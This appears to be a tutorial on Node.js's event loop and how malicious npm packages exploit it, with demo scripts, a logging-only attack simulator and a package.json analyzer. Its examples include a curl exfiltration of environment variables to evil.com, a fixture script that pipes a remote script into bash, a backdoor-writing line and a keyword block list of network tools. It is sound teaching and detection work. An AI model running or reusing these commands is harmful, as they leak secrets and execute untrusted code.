# Phase 1, Part 1: JavaScript Execution Model and Supply Chain Attacks

Welcome to the first hands-on phase of our journey. Before we can secure our dependencies, we need to understand the execution environment that makes package installation dangerous in the first place.

---

## The Target: Understanding JavaScript's Runtime Architecture

**What specific file, configuration, or feature are we building right now?**

We're building a series of visual demonstration scripts that will make JavaScript's execution model tangible. These scripts will help us understand exactly how malicious code can execute during `npm install` by visualizing:

1. The Call Stack - where synchronous code executes
2. The Heap - where objects and functions are stored in memory
3. The Event Loop - how asynchronous operations are processed
4. The Microtask Queue - where Promise callbacks wait
5. The Macrotask Queue - where setTimeout and I/O operations wait

---

## The Concept: JavaScript's Single-Threaded Reality

**A brief, clear explanation using a simple, real-world analogy**

Imagine you're a waiter at a busy restaurant. You're single-threaded—you can only take one order at a time. But you're incredibly efficient:

1. **The Call Stack** is your notepad. It holds the current order you're handling from start to finish.
2. **The Heap** is your memory. It stores all the menu items, table numbers, and customer preferences you've learned.
3. **The Event Loop** is your manager. When you finish one task, they assign you the next.
4. **Web APIs / Libuv** are the kitchen staff. When you need food prepared, you send the order to the kitchen (async operation) and keep taking new orders while you wait.
5. **Microtasks** are VIP orders—they jump the queue because they need immediate attention (Promise callbacks).
6. **Macrotasks** are regular orders—they wait their turn (setTimeout, I/O operations).

This restaurant analogy helps explain the **Event Loop**: a continuous process where JavaScript checks if the call stack is empty, and if so, processes microtasks first, then macrotasks.

**Why This Matters for Security:**

When `npm install` runs, it executes `preinstall`, `install`, and `postinstall` scripts. These scripts run in this exact environment. A malicious package can:

- Use synchronous operations to **block the event loop**, causing denial of service
- Use asynchronous operations to **hide malicious activity** in callbacks that execute later
- Use `setTimeout` or `setImmediate` to **delay execution** until after installation appears complete
- Use `process.nextTick` to **bypass queue order** and execute critical malicious code immediately

Understanding this execution model is crucial for detecting and preventing supply chain attacks.

---

## The Implementation: Visualizing JavaScript's Execution Model

Let's build our first script to visualize the call stack, heap, event loop, microtasks, and macrotasks in action.

### Step 1: Setting Up Our Project

First, let's create the directory structure for Phase 1:

```bash
# Navigate to your tutorial directory
cd beyond-cves-tutorial

# Create Phase 1 directory
mkdir -p phase-1
cd phase-1

# Initialize package.json
npm init -y

# We'll add a custom script for easy running
```

### Step 2: Our First Visualization Script

Create the following file:

```javascript
// path: phase-1/01-call-stack-visualizer.js

/**
 * CALL STACK, HEAP, AND EVENT LOOP VISUALIZER
 * 
 * This script demonstrates how JavaScript executes code
 * by showing the order of operations in different queues.
 * 
 * Run with: node 01-call-stack-visualizer.js
 */

// ==========================================
// 1. SETUP: Utility for visual logging
// ==========================================

// Track execution order for visualization
const executionLog = [];

/**
 * Logs a message with a timestamp and adds it to the execution log
 * @param {string} message - The message to log
 * @param {string} source - The source queue/context (e.g., 'Call Stack', 'Microtask', 'Macrotask')
 */
function logExecution(message, source = 'Call Stack') {
    // Create a timestamp for visualization
    const timestamp = Date.now();
    const logEntry = {
        timestamp,
        message,
        source,
        order: executionLog.length + 1
    };
    executionLog.push(logEntry);
    
    // Format the log message for console output
    const colorMap = {
        'Call Stack': '\x1b[36m', // Cyan
        'Microtask': '\x1b[33m',  // Yellow
        'Macrotask': '\x1b[32m',  // Green
        'Heap': '\x1b[35m'        // Magenta
    };
    const color = colorMap[source] || '\x1b[0m';
    const reset = '\x1b[0m';
    
    console.log(
        `${color}[${source}]${reset} ${message} (Order: ${logEntry.order})`
    );
}

// ==========================================
// 2. HEAP DEMONSTRATION: Memory allocation
// ==========================================

/**
 * The HEAP is where objects, functions, and closures are stored in memory.
 * This is separate from the call stack, which manages execution flow.
 */

// Objects stored in the heap
const heapObject = {
    name: 'I live in the heap',
    id: 1,
    nested: {
        value: 'Nested objects also live in the heap'
    }
};

// Functions stored in the heap
function heapFunction() {
    logExecution('Heap function called from the heap', 'Heap');
    return 'Function executed';
}

// We can reference heap data from the call stack
logExecution(
    `Heap object created with ID: ${heapObject.id}, Name: ${heapObject.name}`,
    'Heap'
);

// ==========================================
// 3. CALL STACK DEMONSTRATION: Synchronous execution
// ==========================================

/**
 * The CALL STACK is a LIFO (Last In, First Out) data structure
 * that tracks function execution. 
 * 
 * When a function is called, it's pushed onto the stack.
 * When it returns, it's popped off the stack.
 */

// Synchronous function - will execute immediately on the call stack
function synchronousFunctionA() {
    logExecution('Function A entered', 'Call Stack');
    
    // Call another function - this will be pushed onto the stack on top of A
    synchronousFunctionB();
    
    // This logs after Function B returns
    logExecution('Function A exiting', 'Call Stack');
}

function synchronousFunctionB() {
    logExecution('Function B entered', 'Call Stack');
    
    // Call a third function
    synchronousFunctionC();
    
    logExecution('Function B exiting', 'Call Stack');
}

function synchronousFunctionC() {
    logExecution('Function C entered (deepest in stack)', 'Call Stack');
    
    // This function contains actual work
    const result = 2 + 2;
    logExecution(`Function C computed: ${result}`, 'Call Stack');
    
    logExecution('Function C exiting', 'Call Stack');
}

// Call the synchronous function - this starts the chain
logExecution('=== CALL STACK EXECUTION START ===', 'Call Stack');
synchronousFunctionA();
logExecution('=== CALL STACK EXECUTION COMPLETE ===', 'Call Stack');

// ==========================================
// 4. EVENT LOOP DEMONSTRATION: Asynchronous execution
// ==========================================

/**
 * The EVENT LOOP continuously checks if the call stack is empty.
 * When empty, it processes microtasks first, then macrotasks.
 */

logExecution('=== ASYNCHRONOUS EXECUTION START ===', 'Call Stack');

// 4A. MICROTASKS: Processed immediately after the current call stack clears
// Microtasks include: Promise.then(), Promise.catch(), queueMicrotask(), process.nextTick()

// Promise resolves with a microtask
Promise.resolve()
    .then(() => {
        logExecution('Promise.then microtask 1 executed', 'Microtask');
    })
    .then(() => {
        logExecution('Promise.then microtask 2 executed (chained)', 'Microtask');
    });

// queueMicrotask - explicit microtask scheduling
queueMicrotask(() => {
    logExecution('queueMicrotask executed', 'Microtask');
});

// process.nextTick - Node.js specific, highest priority microtask
if (typeof process !== 'undefined' && process.nextTick) {
    process.nextTick(() => {
        logExecution('process.nextTick executed (highest priority microtask)', 'Microtask');
    });
}

// 4B. MACROTASKS: Processed after all microtasks are complete
// Macrotasks include: setTimeout, setInterval, setImmediate, I/O operations

// setTimeout - schedules a macrotask
setTimeout(() => {
    logExecution('setTimeout 0ms macrotask executed', 'Macrotask');
}, 0);

// setTimeout with delay - schedules a macrotask
setTimeout(() => {
    logExecution('setTimeout 10ms macrotask executed', 'Macrotask');
}, 10);

// setImmediate - Node.js specific macrotask (executes in the Check phase)
if (typeof setImmediate !== 'undefined') {
    setImmediate(() => {
        logExecution('setImmediate macrotask executed', 'Macrotask');
    });
}

// 4C. Mixed execution - demonstrating queue priority

// This creates a nested microtask inside a macrotask
setTimeout(() => {
    logExecution('Outer setTimeout (macrotask)', 'Macrotask');
    
    // Nested Promise - this becomes a microtask within the macrotask
    Promise.resolve().then(() => {
        logExecution('Inner Promise.then (microtask inside macrotask)', 'Microtask');
    });
}, 5);

// Another microtask after some macrotasks are scheduled
queueMicrotask(() => {
    logExecution('queueMicrotask after macrotask scheduling', 'Microtask');
});

logExecution('=== ASYNCHRONOUS EXECUTION SCHEDULED ===', 'Call Stack');

// ==========================================
// 5. ANALYSIS: Understanding the execution order
// ==========================================

/**
 * Now let's analyze what happened:
 * 
 * 1. All synchronous code executes first (Call Stack)
 *    - This includes logging messages and scheduling async operations
 * 
 * 2. When the call stack is empty, the Event Loop processes MICROTASKS
 *    - process.nextTick (if available)
 *    - Promise.then callbacks
 *    - queueMicrotask callbacks
 * 
 * 3. After all microtasks are processed, the Event Loop processes one MACROTASK
 *    - setTimeout callbacks
 *    - setImmediate callbacks (Node.js)
 *    - I/O operations
 * 
 * 4. After processing a macrotask, the Event Loop checks for microtasks again
 *    (this is why nested microtasks within macrotasks execute immediately)
 * 
 * This priority system ensures that promises and other high-priority
 * operations execute as soon as possible.
 */

// ==========================================
// 6. OUTPUT: Display execution summary
// ==========================================

// Use setImmediate to log after all async operations complete
// (as much as possible in this single run)
setTimeout(() => {
    console.log('\n' + '='.repeat(60));
    console.log('EXECUTION ORDER SUMMARY');
    console.log('='.repeat(60));
    
    executionLog.forEach(entry => {
        console.log(
            `${entry.order}. [${entry.source}] ${entry.message}`
        );
    });
    
    console.log('='.repeat(60));
    console.log(`Total operations logged: ${executionLog.length}`);
    console.log('='.repeat(60));
    
    // Explanation of execution order
    console.log('\n📚 KEY INSIGHTS:');
    console.log('1. ALL synchronous code on the Call Stack executes FIRST');
    console.log('2. ALL Microtasks (Promises, queueMicrotask) execute SECOND');
    console.log('3. ONE Macrotask (setTimeout) executes THIRD');
    console.log('4. This continues until all queues are empty');
    console.log('\n⚠️ SECURITY IMPLICATION:');
    console.log('   Malicious packages can use microtasks to execute code');
    console.log('   BEFORE other scheduled operations run, or use macrotasks');
    console.log('   to delay execution and hide activity.');
}, 20);

// Log that we've finished scheduling
logExecution('All operations scheduled, waiting for event loop...', 'Call Stack');

/**
 * EXPLANATION OF EXECUTION FLOW:
 * 
 * When you run this script, you'll see:
 * 
 * 1. Call Stack operations complete in order
 * 2. All microtasks execute (process.nextTick first, then Promises, then queueMicrotask)
 * 3. Macrotasks execute one at a time, with microtasks between each
 * 
 * The exact order may vary slightly between Node.js versions, but the
 * priority remains: Call Stack > Microtasks > Macrotasks
 */
```

### Step 3: Create a Simpler Visualization for Beginners

Let's create a more beginner-friendly version that focuses specifically on the execution order:

```javascript
// path: phase-1/02-event-loop-demo.js

/**
 * SIMPLE EVENT LOOP DEMONSTRATION
 * 
 * This script shows the execution order of synchronous code,
 * microtasks, and macrotasks in a simplified way.
 * 
 * Run with: node 02-event-loop-demo.js
 */

console.log('🔵 START: Synchronous code begins');

// 1. Synchronous operation - executes immediately
console.log('🔵 1. This is synchronous, runs immediately');

// 2. setTimeout - schedules a macrotask (timer phase)
setTimeout(() => {
    console.log('🟢 4. setTimeout callback (macrotask) - runs after microtasks');
}, 0);

// 3. Promise - schedules a microtask
Promise.resolve()
    .then(() => {
        console.log('🟡 3. Promise.then (microtask) - runs before setTimeout');
    });

// 4. process.nextTick - highest priority microtask (Node.js)
if (typeof process !== 'undefined' && process.nextTick) {
    process.nextTick(() => {
        console.log('🟠 2. process.nextTick (microtask) - highest priority, runs first among microtasks');
    });
}

// 5. queueMicrotask - explicit microtask
queueMicrotask(() => {
    console.log('🟡 3.5. queueMicrotask (microtask) - runs with other microtasks');
});

// 6. Synchronous operation after scheduling async tasks
console.log('🔵 5. This synchronous code runs AFTER scheduling async tasks');

// 7. setImmediate - Node.js macrotask (check phase)
if (typeof setImmediate !== 'undefined') {
    setImmediate(() => {
        console.log('🟢 6. setImmediate (macrotask) - runs in check phase');
    });
}

console.log('🔵 END: Synchronous code completes');

// After 10ms, log a summary
setTimeout(() => {
    console.log('\n' + '='.repeat(50));
    console.log('EXECUTION ORDER SUMMARY');
    console.log('='.repeat(50));
    console.log('1. Synchronous code (Call Stack)');
    console.log('2. process.nextTick (Microtask)');
    console.log('3. Promise.then / queueMicrotask (Microtasks)');
    console.log('4. setTimeout (Macrotask - Timer phase)');
    console.log('5. setImmediate (Macrotask - Check phase)');
    console.log('='.repeat(50));
    console.log('⚠️ SECURITY TAKEAWAY:');
    console.log('   process.nextTick runs BEFORE Promise callbacks');
    console.log('   Promise callbacks run BEFORE setTimeout');
    console.log('   setTimeout 0ms is NOT guaranteed to run immediately');
    console.log('   This ordering matters when analyzing malicious packages!');
}, 15);
```

---

## The Verification: Testing Our Visualization Scripts

Let's verify our implementation works correctly.

**✅ Verification Step 1: Run the Call Stack Visualizer**

```bash
# From the phase-1 directory
$ node 01-call-stack-visualizer.js
```

You should see output showing:
1. Synchronous code executing in order (Call Stack)
2. Microtasks executing (Promises, queueMicrotask, process.nextTick)
3. Macrotasks executing (setTimeout, setImmediate)

The order should demonstrate that the call stack executes first, then microtasks, then macrotasks.

**Expected output snippet:**

```
[Call Stack] === CALL STACK EXECUTION START ===
[Call Stack] Function A entered
[Call Stack] Function B entered
[Call Stack] Function C entered
[Call Stack] Function C computed: 4
[Call Stack] Function C exiting
[Call Stack] Function B exiting
[Call Stack] Function A exiting
[Call Stack] === CALL STACK EXECUTION COMPLETE ===
[Call Stack] === ASYNCHRONOUS EXECUTION START ===
[Call Stack] === ASYNCHRONOUS EXECUTION SCHEDULED ===
[Microtask] process.nextTick executed (highest priority microtask)
[Microtask] Promise.then microtask 1 executed
[Microtask] Promise.then microtask 2 executed (chained)
[Microtask] queueMicrotask executed
[Microtask] queueMicrotask after macrotask scheduling
[Macrotask] setImmediate macrotask executed
[Macrotask] setTimeout 0ms macrotask executed
[Macrotask] Outer setTimeout (macrotask)
[Microtask] Inner Promise.then (microtask inside macrotask)
[Macrotask] setTimeout 10ms macrotask executed
```

**✅ Verification Step 2: Run the Simple Event Loop Demo**

```bash
$ node 02-event-loop-demo.js
```

You should see:

```
🔵 START: Synchronous code begins
🔵 1. This is synchronous, runs immediately
🔵 5. This synchronous code runs AFTER scheduling async tasks
🔵 END: Synchronous code completes
🟠 2. process.nextTick (microtask) - highest priority, runs first among microtasks
🟡 3. Promise.then (microtask) - runs before setTimeout
🟡 3.5. queueMicrotask (microtask) - runs with other microtasks
🟢 4. setTimeout callback (macrotask) - runs after microtasks
🟢 6. setImmediate (macrotask) - runs in check phase

==================================================
EXECUTION ORDER SUMMARY
==================================================
1. Synchronous code (Call Stack)
2. process.nextTick (Microtask)
3. Promise.then / queueMicrotask (Microtasks)
4. setTimeout (Macrotask - Timer phase)
5. setImmediate (Macrotask - Check phase)
==================================================
⚠️ SECURITY TAKEAWAY:
   process.nextTick runs BEFORE Promise callbacks
   Promise callbacks run BEFORE setTimeout
   setTimeout 0ms is NOT guaranteed to run immediately
   This ordering matters when analyzing malicious packages!
```

**✅ Verification Step 3: Verify All Files Exist**

```bash
$ ls -la
# Should show:
# 01-call-stack-visualizer.js
# 02-event-loop-demo.js
# package.json
```

---

## Deep Dive: Why This Matters for Security

Understanding the execution model is critical because malicious packages exploit these mechanics:

### 1. process.nextTick - The Hidden Attack Vector

```javascript
// Example of a malicious package using process.nextTick
function maliciousInstall() {
    // This runs immediately when the package is required
    console.log('Package appears to be installing...');
    
    // But this code executes BEFORE any other microtasks or macrotasks
    process.nextTick(() => {
        // Steal environment variables
        const secrets = process.env;
        // Exfiltrate them (simulated)
        console.log('🔴 MALICIOUS: Secrets stolen!');
        console.log('   NODE_ENV:', process.env.NODE_ENV);
        console.log('   DATABASE_URL:', process.env.DATABASE_URL ? '*****' : 'not set');
        console.log('   API_KEY:', process.env.API_KEY ? '*****' : 'not set');
    });
}
```

### 2. Promise Hijacking - The Timing Attack

```javascript
// Example of using Promises to delay malicious execution
function delayedAttack() {
    // This code runs during installation
    
    // Schedule a Promise that executes after the call stack clears
    // but before any setTimeout callbacks
    Promise.resolve().then(() => {
        // This runs in the microtask phase
        // It happens before the "install complete" message would appear
        console.log('🔴 MALICIOUS: Running in microtask phase!');
        
        // Start a background process
        require('child_process').exec('curl http://evil.com/exfil?data=' + JSON.stringify(process.env));
    });
}
```

### 3. setTimeout Evasion - The Delayed Execution

```javascript
// Example of using setTimeout to hide malicious activity
function delayedExecution() {
    // The package appears to install normally
    console.log('✅ Package installed successfully!');
    
    // But setTimeout schedules code to run later
    // This happens after the installation process appears complete
    setTimeout(() => {
        console.log('🔴 MALICIOUS: This runs 5 seconds after install');
        // By this point, the developer has moved on and may not notice
        require('child_process').exec('node -e "require(\'fs\').writeFileSync(\'backdoor.js\', \'...\')"');
    }, 5000);
}
```

### 4. Event Loop Starvation - The Denial of Service

```javascript
// Example of blocking the event loop
function blockEventLoop() {
    // Synchronous infinite loop - blocks the entire event loop
    // This prevents any other operations from running
    const start = Date.now();
    while (Date.now() - start < 10000) {
        // Busy loop for 10 seconds
        // The entire Node.js process is frozen during this time
        // No other callbacks execute, no HTTP responses, nothing
    }
    console.log('🔴 MALICIOUS: Event loop blocked for 10 seconds');
}
```

---

## Understanding the Event Loop in More Detail

Let's add a visual reference script that illustrates the event loop phases:

```javascript
// path: phase-1/03-event-loop-phases.js

/**
 * EVENT LOOP PHASES DEMONSTRATION
 * 
 * This script illustrates the different phases of the event loop
 * and their execution order in Node.js.
 * 
 * Run with: node 03-event-loop-phases.js
 */

console.log('🔵 PHASE 0: Start - Synchronous code');

// Phase 1: Timers - setTimeout and setInterval
setTimeout(() => {
    console.log('🟢 PHASE 1: Timers - setTimeout callback');
}, 0);

// Phase 2: I/O Callbacks - pending I/O operations
const fs = require('fs');
// Simulate an I/O operation that completes immediately
setImmediate(() => {
    console.log('🟢 PHASE 3: Idle/Prepare - setImmediate after I/O');
});

// Phase 3: Idle, Prepare - internal phase (not typically used directly)

// Phase 4: Poll - retrieve new I/O events, execute I/O callbacks
// Phase 5: Check - setImmediate callbacks
setImmediate(() => {
    console.log('🟢 PHASE 5: Check - setImmediate callback');
});

// Phase 6: Close Callbacks - socket.on('close', ...)
// We won't demonstrate this with actual sockets

// Let's add some microtasks to see how they interleave
Promise.resolve().then(() => {
    console.log('🟡 MICROTASK: Promise.then (runs between phases)');
});

process.nextTick(() => {
    console.log('🟠 MICROTASK: process.nextTick (highest priority)');
});

console.log('🔵 PHASE 0: End - Synchronous code complete');

// Add a final message after the event loop has had time to run
setTimeout(() => {
    console.log('\n📚 EVENT LOOP PHASE ORDER (Node.js):');
    console.log('1. Timers (setTimeout, setInterval)');
    console.log('2. I/O Callbacks (pending operations)');
    console.log('3. Idle/Prepare (internal)');
    console.log('4. Poll (new I/O, file reads)');
    console.log('5. Check (setImmediate)');
    console.log('6. Close Callbacks (socket close)');
    console.log('\n⚠️ IMPORTANT: Microtasks (process.nextTick, Promise.then)');
    console.log('   execute BETWEEN each phase, not just at the end!');
}, 10);
```

---

## Visualizing the Attack Surface

Let's create a practical example that shows how a malicious package might actually exploit these mechanics:

```javascript
// path: phase-1/04-malicious-package-simulator.js

/**
 * MALICIOUS PACKAGE BEHAVIOR SIMULATOR
 * 
 * This script demonstrates how a malicious package could
 * exploit JavaScript's execution model to perform unauthorized actions.
 * 
 * ⚠️ WARNING: This is a SIMULATION. It only logs to console
 * and does not actually perform any harmful actions.
 * 
 * Run with: node 04-malicious-package-simulator.js
 */

console.log('📦 Simulating malicious package installation...\n');

// ==========================================
// Stage 1: During Installation (Synchronous)
// ==========================================

console.log('📦 Stage 1: Immediate synchronous execution');

// Malicious code that executes immediately
try {
    // Looks like a legitimate package initialization
    console.log('✅ Initializing package...');
    
    // But actually performs reconnaissance
    console.log('🔍 Reconnaissance:');
    console.log(`   - Platform: ${process.platform}`);
    console.log(`   - Node Version: ${process.version}`);
    console.log(`   - Working Directory: ${process.cwd()}`);
    console.log(`   - Environment Variables: ${Object.keys(process.env).length} set`);
    
    // Check for sensitive environment variables
    const sensitiveVars = ['AWS_SECRET', 'DATABASE_URL', 'API_KEY', 'NODE_ENV'];
    const foundSensitive = sensitiveVars.filter(key => process.env[key]);
    if (foundSensitive.length > 0) {
        console.log(`   ⚠️ Found sensitive variables: ${foundSensitive.join(', ')}`);
    }
} catch (error) {
    console.log('❌ Error during initialization:', error.message);
}

// ==========================================
// Stage 2: Microtask Hijacking
// ==========================================

console.log('\n📦 Stage 2: Microtask injection');

// process.nextTick - highest priority, runs before anything else
if (typeof process !== 'undefined' && process.nextTick) {
    process.nextTick(() => {
        console.log('🔴 [process.nextTick] Hijacking microtask queue');
        console.log('   Attempting to establish persistence...');
        
        // In a real attack, this would:
        // 1. Write a backdoor script
        // 2. Modify package.json to run malicious code on every install
        // 3. Set up a cron job or scheduled task
        console.log('   ⚠️ Would install persistence mechanism here');
    });
}

// Promise.then - runs after process.nextTick
Promise.resolve()
    .then(() => {
        console.log('🔴 [Promise.then] Exfiltrating data via microtask');
        console.log('   Reading filesystem...');
        
        try {
            // In a real attack, this would read package.json, .env, etc.
            console.log('   ⚠️ Would read package.json and .env files here');
            
            // Simulated data collection
            const sensitiveData = {
                package: require('./package.json').name,
                envCount: Object.keys(process.env).length,
                nodeVersion: process.version
            };
            
            console.log(`   📤 Would exfiltrate: ${JSON.stringify(sensitiveData)}`);
        } catch (err) {
            // If package.json isn't available yet
            console.log('   ⚠️ Would read sensitive files');
        }
    });

// ==========================================
// Stage 3: Macrotask for Delayed Execution
// ==========================================

console.log('\n📦 Stage 3: Delayed execution via macrotasks');

// setTimeout with 0 delay - runs after all microtasks
setTimeout(() => {
    console.log('🔴 [setTimeout 0ms] Delayed execution begins');
    console.log('   This runs after the installation appears complete');
    console.log('   ⚠️ Would establish network connections here');
    
    // In a real attack, this would:
    // - Open a socket to a command and control server
    // - Download additional payloads
    // - Start a cryptocurrency miner
    console.log('   📡 Would establish outbound connection to C2 server');
}, 0);

// setTimeout with longer delay - even more hidden
setTimeout(() => {
    console.log('🔴 [setTimeout 5s] Long-delayed execution');
    console.log('   This runs 5 seconds after install');
    console.log('   ⚠️ Would execute persistent malicious activity');
    console.log('   🔄 Would start background process');
}, 5000);

// ==========================================
// Stage 4: setImmediate for Check Phase
// ==========================================

if (typeof setImmediate !== 'undefined') {
    setImmediate(() => {
        console.log('🔴 [setImmediate] Check phase execution');
        console.log('   This runs in the check phase of the event loop');
        console.log('   ⚠️ Would modify system files here');
    });
}

// ==========================================
// Stage 5: Event Loop Blocking (DoS)
// ==========================================

console.log('\n📦 Stage 4: Event loop blocking');

// Malicious package might block the event loop
// Commented out because it would freeze the process
/*
const start = Date.now();
console.log('⏳ Blocking event loop for 5 seconds...');
while (Date.now() - start < 5000) {
    // Busy loop - blocks everything
}
console.log('🔴 Event loop blocked for 5 seconds');
*/

console.log('\n✅ Installation appears complete...');
console.log('📌 But the package has already executed multiple attack vectors!\n');

// ==========================================
// Summary of Attack Vectors
// ==========================================

// Schedule a final summary after all operations
setTimeout(() => {
    console.log('='.repeat(60));
    console.log('📋 ATTACK VECTOR SUMMARY');
    console.log('='.repeat(60));
    console.log('1. ✅ Synchronous reconnaissance during install');
    console.log('2. 🔴 process.nextTick hijacking for priority execution');
    console.log('3. 🔴 Promise.then for microtask-based exfiltration');
    console.log('4. 🔴 setTimeout for delayed execution (0ms)');
    console.log('5. 🔴 setTimeout for long-delayed execution (5s)');
    console.log('6. 🔴 setImmediate for check phase execution');
    console.log('7. ⚠️ Event loop blocking for DoS (commented out)');
    console.log('='.repeat(60));
    console.log('🔑 KEY TAKEAWAY:');
    console.log('   Traditional scanners checking for CVEs would miss ALL of these!');
    console.log('   Behavioral analysis is required to detect this type of threat.');
}, 100);
```

---

## Practical Exercise: Building a Simple Install Script Monitor

Now let's build something practical—a simple script that monitors package installation and logs suspicious behavior:

```javascript
// path: phase-1/05-install-monitor.js

/**
 * INSTALL SCRIPT MONITOR
 * 
 * This script demonstrates how to monitor package installation
 * and detect suspicious lifecycle scripts.
 * 
 * Run with: node 05-install-monitor.js
 */

const fs = require('fs');
const path = require('path');
const { execSync, spawn } = require('child_process');

console.log('🔍 Package Install Monitor');
console.log('Monitoring installation process for suspicious behavior...\n');

/**
 * Analyzes a package.json file for suspicious scripts
 * @param {string} packagePath - Path to the package.json file
 */
function analyzePackageScripts(packagePath) {
    console.log(`📦 Analyzing: ${packagePath}`);
    
    try {
        // Read and parse package.json
        const packageContent = fs.readFileSync(packagePath, 'utf8');
        const packageData = JSON.parse(packageContent);
        
        // Check for scripts in package.json
        const scripts = packageData.scripts || {};
        const suspiciousScripts = [];
        
        // Define suspicious script patterns
        const dangerousKeywords = [
            'curl', 'wget', 'exec', 'eval', 'child_process',
            'fs', 'http', 'https', 'net', 'tcp', 'udp',
            'process.env', 'crypto', 'bcrypt', 'password',
            'rm', 'del', 'unlink', 'chmod', 'chown',
            'sudo', 'install', 'postinstall', 'preinstall'
        ];
        
        // Check each script for dangerous patterns
        Object.entries(scripts).forEach(([name, command]) => {
            const lowerCommand = command.toLowerCase();
            const matchedKeywords = dangerousKeywords.filter(keyword => 
                lowerCommand.includes(keyword)
            );
            
            if (matchedKeywords.length > 0) {
                suspiciousScripts.push({
                    name,
                    command,
                    matchedKeywords
                });
            }
        });
        
        // Report findings
        if (suspiciousScripts.length > 0) {
            console.log('⚠️  Suspicious scripts detected:');
            suspiciousScripts.forEach(script => {
                console.log(`   📜 "${script.name}": ${script.command}`);
                console.log(`      Keywords: ${script.matchedKeywords.join(', ')}`);
            });
        } else {
            console.log('✅ No suspicious scripts detected in package.json');
        }
        
        // Check for lifecycle scripts specifically
        const lifecycleScripts = ['preinstall', 'install', 'postinstall', 'preuninstall', 'uninstall'];
        const foundLifecycle = lifecycleScripts.filter(name => scripts[name]);
        
        if (foundLifecycle.length > 0) {
            console.log('📋 Lifecycle scripts found:');
            foundLifecycle.forEach(name => {
                console.log(`   ✅ ${name}: ${scripts[name]}`);
            });
        }
        
        // Check for dependencies count (large dependency tree = more risk)
        const deps = {
            dependencies: Object.keys(packageData.dependencies || {}).length,
            devDependencies: Object.keys(packageData.devDependencies || {}).length,
            peerDependencies: Object.keys(packageData.peerDependencies || {}).length
        };
        
        const totalDeps = deps.dependencies + deps.devDependencies + deps.peerDependencies;
        if (totalDeps > 50) {
            console.log(`📊 Large dependency tree (${totalDeps} packages) - increased risk`);
        }
        
        return {
            hasSuspiciousScripts: suspiciousScripts.length > 0,
            suspiciousScripts,
            lifecycleScripts: foundLifecycle,
            dependencyCount: totalDeps
        };
        
    } catch (error) {
        console.error('❌ Error analyzing package.json:', error.message);
        return {
            hasSuspiciousScripts: false,
            error: error.message
        };
    }
}

/**
 * Checks if a package name looks like typosquatting
 * @param {string} packageName - The package name to check
 * @param {string[]} knownPackages - List of known legitimate packages
 */
function checkTyposquatting(packageName, knownPackages = ['express', 'react', 'lodash', 'axios', 'typescript']) {
    const suspicious = [];
    
    knownPackages.forEach(known => {
        // Check for common typosquatting patterns
        const permutations = [
            known + '-', // append dash
            known + '_', // append underscore
            known + 'js', // append 'js'
            known + 'node', // append 'node'
            known + '-core', // append '-core'
            known + '-lib', // append '-lib'
            known + 's', // plural
            known.replace(/s$/, ''), // remove plural
            known.replace(/-/g, ''), // remove dashes
            known.replace(/\./g, ''), // remove dots
            known + '2', // append number
            known + '3', // append number
            known + '4', // append number
            known + '-latest', // append '-latest'
            known + '-stable', // append '-stable'
        ];
        
        if (permutations.some(perm => packageName === perm && packageName !== known)) {
            suspicious.push({
                package: packageName,
                resembles: known,
                reason: 'Typosquatting'
            });
        }
    });
    
    return suspicious;
}

/**
 * Demonstrates analyzing a real package
 */
function demonstratePackageAnalysis() {
    console.log('\n' + '='.repeat(60));
    console.log('📦 DEMONSTRATION: Analyzing a package');
    console.log('='.repeat(60));
    
    // Create a temporary package.json with suspicious scripts
    const tempDir = path.join(__dirname, 'temp-package');
    if (!fs.existsSync(tempDir)) {
        fs.mkdirSync(tempDir);
    }
    
    const maliciousPackageJson = {
        name: 'example-malicious',
        version: '1.0.0',
        scripts: {
            preinstall: 'node -e "process.env.MALICIOUS=true"',
            install: 'curl http://evil.com/setup.sh | bash',
            postinstall: 'node -e "require(\'fs\').writeFileSync(\'backdoor.js\', \'console.log(\'backdoor\')\')"',
            test: 'echo "All tests passed"'
        },
        dependencies: {
            express: '^4.18.0',
            react: '^18.2.0'
        },
        devDependencies: {
            typescript: '^5.0.0'
        }
    };
    
    const tempPackagePath = path.join(tempDir, 'package.json');
    fs.writeFileSync(tempPackagePath, JSON.stringify(maliciousPackageJson, null, 2));
    
    console.log('📝 Created test package.json with malicious scripts');
    console.log('🔍 Analyzing...\n');
    
    const result = analyzePackageScripts(tempPackagePath);
    
    // Check for typosquatting
    const typosquatting = checkTyposquatting('express-latest');
    if (typosquatting.length > 0) {
        console.log('\n⚠️  Typosquatting detected:');
        typosquatting.forEach(item => {
            console.log(`   📦 ${item.package} → resembles ${item.resembles}`);
        });
    }
    
    console.log('\n📊 Analysis complete!');
    
    // Clean up
    fs.unlinkSync(tempPackagePath);
    fs.rmdirSync(tempDir);
}

// Run the demonstration
demonstratePackageAnalysis();

// ==========================================
// PRACTICAL EXERCISE
// ==========================================

console.log('\n' + '='.repeat(60));
console.log('🧪 PRACTICAL EXERCISE');
console.log('='.repeat(60));
console.log('1. Create a new project:');
console.log('   $ mkdir test-project && cd test-project && npm init -y');
console.log('\n2. Add a suspicious script to package.json:');
console.log('   Add to "scripts": { "postinstall": "node -e \\"console.log(\\\'Hello\\\')\\\"" }');
console.log('\n3. Run the analyzer on your project:');
console.log('   $ node 05-install-monitor.js');
console.log('\n4. Try adding real malicious patterns and see what gets detected!');
```

---

## Key Takeaways from Phase 1, Part 1

1. **JavaScript is single-threaded** - The call stack processes one function at a time, but the event loop manages asynchronous operations efficiently.

2. **Microtasks have priority** - `process.nextTick` and Promises execute before macrotasks (setTimeout, setImmediate).

3. **Malicious packages exploit execution order** - They can use microtasks for immediate execution and macrotasks for delayed/hidden execution.

4. **The event loop is not always your friend** - While it enables high performance, it also creates timing windows that attackers exploit.

5. **Behavioral analysis matters** - Traditional CVE-based scanning misses these attack vectors entirely.

In the next part, we'll dive deep into the `npm install` lifecycle, exploring exactly what happens when you install a package and how attackers exploit each phase of the installation process.
